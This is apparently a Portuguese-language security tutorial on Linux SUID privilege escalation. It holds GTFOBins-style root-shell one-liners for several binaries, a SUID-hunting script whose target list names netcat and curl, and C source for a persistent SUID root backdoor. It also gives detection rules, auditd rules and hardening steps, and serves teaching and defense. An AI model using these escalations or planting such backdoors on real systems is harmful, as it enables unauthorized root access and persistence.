---
title: "Abuso de SUID — Escalando para Root com Binários Esquecidos"
date: 2025-01-14
description: "Como binários SUID mal configurados no Linux podem ser usados como arma para escalonamento de privilégios usando técnicas do GTFOBins e scripts de enumeração customizados."
category: privesc
os: [linux]
difficulty: medium
mitre_tactic: TA0004
mitre_technique: T1548.001
tags: [suid, linux, privesc, gtfobins, setuid, enumeration]
status: published
lang: pt
readingTime: 9
---

## O que é SUID?

O bit **SUID (Set User ID)** é uma permissão especial do Linux que faz com que um executável rode com os **privilégios do dono do arquivo** em vez do usuário que o invocou.

Quando um binário cujo dono é `root` possui o bit SUID ativado, qualquer usuário que o execute ganha acesso temporário em nível de root pela duração daquele processo. Isso é intencional para binários como `/usr/bin/passwd` — mas se torna um vetor crítico de ataque quando encontrado em binários inesperados.

```bash
# Exemplo de permissão — o 's' na posição de execução do dono = SUID ativado
-rwsr-xr-x 1 root root 67816 Jan  5 12:00 /usr/bin/passwd
```

> **MITRE ATT&CK:** Esta técnica é mapeada como [T1548.001 — Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) sob a tática de Escalonamento de Privilégios (Privilege Escalation - TA0004).

---

## Passo 1 — Enumerar Binários SUID

O primeiro passo é encontrar todos os binários com SUID habilitado no sistema.

```bash
# Encontra todos os binários SUID (suprime erros de permissão negada)
find / -perm -u=s -type f 2>/dev/null

# Limita a busca a caminhos comuns de binários para maior velocidade
find /usr /bin /sbin /opt /home -perm -u=s -type f 2>/dev/null

# Também checa binários SGID (roda como dono do grupo)
find / -perm -g=s -type f 2>/dev/null
```

Um sistema limpo retornará uma lista curta e previsível. Procure por qualquer coisa **incomum** — caminhos não padrão, scripts customizados, ou ferramentas de desenvolvimento.

---

## Passo 2 — Cruzamento de Referência com o GTFOBins

O [GTFOBins](https://gtfobins.github.io/) é a referência definitiva para binários Unix que podem ser abusados quando possuem permissões elevadas.

### find

```bash
# Verifica se o SUID está ativado
ls -la $(which find)
# -rwsr-xr-x 1 root root 204112 ... /usr/bin/find

# Exploração — spawna uma shell root
find . -exec /bin/sh -p \; -quit

# Verifica o escalonamento
whoami
# root
```

A flag `-p` é crítica — ela diz ao `sh` para **preservar o UID efetivo** em vez de descartá-lo.

### vim / vi

```bash
# Checa
ls -la $(which vim)

# Método 1: via extensão Python3
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Método 2: spawn direto de shell
vim -c ':!sh -p'

# Método 3: via escape de shell no modo normal (dentro do vim)
# :set shell=/bin/sh
# :shell
```

### python / python3

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Também funciona no python2 mais antigo
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### bash

```bash
# Apenas explorável se o SUID estiver no próprio bash (raro, mas acontece em CTFs)
ls -la /bin/bash
# -rwsr-xr-x 1 root root ...

bash -p
# bash-5.1# whoami
# root
```

### nmap (versões legacy < 5.35)

```bash
# Modo interativo disponível em versões antigas do nmap
nmap --interactive
nmap> !sh
```

### tar

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### perl

```bash
perl -e 'exec "/bin/sh";'
```

### awk

```bash
awk 'BEGIN {system("/bin/sh -p")}'
```

### less / more

```bash
# Dentro do pager less/more
less /etc/passwd
# Então digite:
!/bin/sh
```

---

## Passo 3 — Script de Enumeração Automatizada

O script a seguir cruza a referência de binários SUID descobertos com uma lista de conhecidos por serem exploráveis e gera os alvos priorizados.

```bash
#!/usr/bin/env bash
# suid_hunter.sh — Enumeração e triagem de SUID
# Uso: ./suid_hunter.sh
# Autor: r3d/ops | KBM Security

RED='\033[0;31m'
YEL='\033[0;33m'
GRN='\033[0;32m'
BLU='\033[0;34m'
RST='\033[0m'

KNOWN_EXPLOITABLE="nmap|vim|vi|find|python|python3|bash|perl|ruby|tar|wget|curl"
KNOWN_EXPLOITABLE+="|nc|netcat|awk|less|more|man|ftp|gdb|strace|ltrace|tclsh"
KNOWN_EXPLOITABLE+="|env|expect|lua|php|ruby|node|git|zip|unzip|7z|aria2c"

echo -e "${BLU}[*] SUID Binary Hunter — r3d/ops${RST}"
echo -e "${BLU}[*] Escaneando o filesystem...${RST}\n"

BINS=$(find / -perm -u=s -type f 2>/dev/null)
TOTAL=$(echo "$BINS" | wc -l)

echo -e "[*] Encontrados ${YEL}${TOTAL}${RST} binários SUID\n"
echo -e "[*] Checando contra a lista de exploráveis conhecidos...\n"

HIT=0
while IFS= read -r bin; do
  name=$(basename "$bin")
  owner=$(stat -c '%U' "$bin" 2>/dev/null)
  perms=$(stat -c '%A' "$bin" 2>/dev/null)

  if echo "$name" | grep -qiE "$KNOWN_EXPLOITABLE"; then
    echo -e "  ${RED}[!!!] EXPLORÁVEL:${RST} $bin"
    echo -e "       Dono: ${YEL}${owner}${RST} | Perm: ${perms}"
    echo -e "       GTFOBins: ${BLU}https://gtfobins.github.io/gtfobins/${name}/#suid${RST}\n"
    HIT=$((HIT + 1))
  else
    echo -e "  ${GRN}[ok]${RST}  $bin  ${BLU}(${owner})${RST}"
  fi
done <<< "$BINS"

echo -e "\n[*] Resumo: ${RED}${HIT} alvo(s) em potencial${RST} de ${TOTAL} binários SUID no total"
```

---

## Passo 4 — Escrevendo um Backdoor SUID Customizado (Cenário de Lab)

Em operações de red team autorizadas, você pode precisar plantar um shell SUID persistente para acesso pós-exploração.

```bash
# Como root — compila um wrapper setuid mínimo para a shell
cat > /tmp/rootshell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF

# Compila e seta o SUID
gcc /tmp/rootshell.c -o /tmp/rootshell
chmod u+s /tmp/rootshell

# Um usuário de baixo privilégio agora pode chamá-lo
/tmp/rootshell
# bash-5.1# whoami
# root
```

> **PERIGO:** Nunca faça deploy de backdoors SUID em sistemas de produção ou sem autorização explícita por escrito. Isso é apenas para ambientes de laboratório autorizados.

---

## Detecção & Mitigação

### Detecções do Blue Team

| Indicador | Fonte de Dados | Lógica da Regra |
|-----------|-------------|------------|
| Novo binário SUID criado | auditd / inotify | `find / -newer /tmp -perm -4000` |
| Binário SUID executa shell | auditd execve | parent=suid_binary, child=/bin/sh |
| Dono SUID inesperado | file integrity | owner=root AND path NOT IN baseline |
| Flag `-p` passada ao shell | process args | `sh -p` OR `bash -p` in cmdline |

### Comandos de Hardening

```bash
# Audita todos os binários SUID — salva uma baseline
find / -perm -4000 -type f 2>/dev/null > /root/suid_baseline.txt

# Remove o SUID de um binário específico
chmod u-s /caminho/para/binario

# Monta partições com nosuid para prevenir SUID naqueles filesystems
# Em /etc/fstab:
# /dev/sdb1 /data ext4 defaults,nosuid,noexec 0 0

# Enforcement de profile do AppArmor
aa-enforce /usr/bin/find

# Verifica a integridade do binário contra o package manager
dpkg --verify    # Debian/Ubuntu
rpm -Va          # RHEL/CentOS
```

### Regras de Monitoramento Recomendadas (auditd)

```bash
# /etc/audit/rules.d/suid.rules

# Monitora a execução de binário SUID
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -k suid_exec

# Monitora chmod/chown mudando o bit SUID
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -F a1=04755 -k suid_create
```

---

## Setup de Laboratório

Para praticar essas técnicas de forma segura, suba uma VM vulnerável:

```bash
# Vagrant — box Linux intencionalmente vulnerável
vagrant init bento/ubuntu-22.04
vagrant up
vagrant ssh

# Configura manualmente um binário vulnerável para prática
sudo chmod u+s /usr/bin/find
find . -exec /bin/sh -p \; -quit
```

Alternativamente, use plataformas dedicadas:
- **HackTheBox** — Máquinas de privilege escalation em Linux
- **TryHackMe** — Sala "Linux PrivEsc"
- **VulnHub** — Kioptrix, série Mr. Robot

---

## Resumo

| Binário | Método de Exploit | Dificuldade |
|--------|---------------|------------|
| `find` | `-exec /bin/sh -p` | Fácil |
| `python3` | `os.execl("/bin/sh","sh","-p")` | Fácil |
| `vim` | `:!sh -p` | Fácil |
| `bash` | `bash -p` | Fácil |
| `tar` | `--checkpoint-action=exec` | Média |
| `nmap` | `--interactive` (legacy) | Média |
| `awk` | `system("/bin/sh")` | Fácil |

A chave para levar disso tudo: **qualquer** binário com SUID ativado que permita execução arbitrária de código ou o spawn de uma shell é um caminho para o root. Sempre enumere binários SUID como parte do seu checklist de escalonamento de privilégios no Linux.